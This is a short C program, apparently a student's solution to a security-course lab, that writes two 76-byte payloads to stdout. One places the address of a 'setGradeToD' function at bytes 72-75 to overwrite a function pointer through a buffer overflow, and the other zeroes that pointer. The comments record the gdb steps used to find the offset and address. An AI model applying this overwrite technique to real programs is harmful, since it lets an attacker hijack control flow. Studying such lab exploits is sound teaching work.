#include <stdio.h>

int main(int argc,char *argv[]) {
	
	
	
	/**
	* (gdb) print (long)&buf - (long)&f
	* $1 = -72
	* (gdb) print setGradeToD
	* $2 = {void (void *)} 0x4007b8 <setGradeToD>
	* Thus, we are filling D[72...75] with address of setGradeToD
	*/	
	//lol it's in reversed order, from right to left....
	char D[76] = "Frank";
	D[72] = 0xb8;
	D[73] = 0x07;
	D[74] = 0x40;
	D[75] = 0x00;
	
	/**
	* This is similar to D, we just simply leave E[72...75] as '\000',
	* so that &f = &checkName will be replaced with all 0s
	*/
	char E[76] = "Frank";


	switch(argv[1][0]) {

	case 'd':
		write(1,D,76);
		break;
	case 'e':
		write(1,E,76);
		break;
	default:
		break;
	}
}
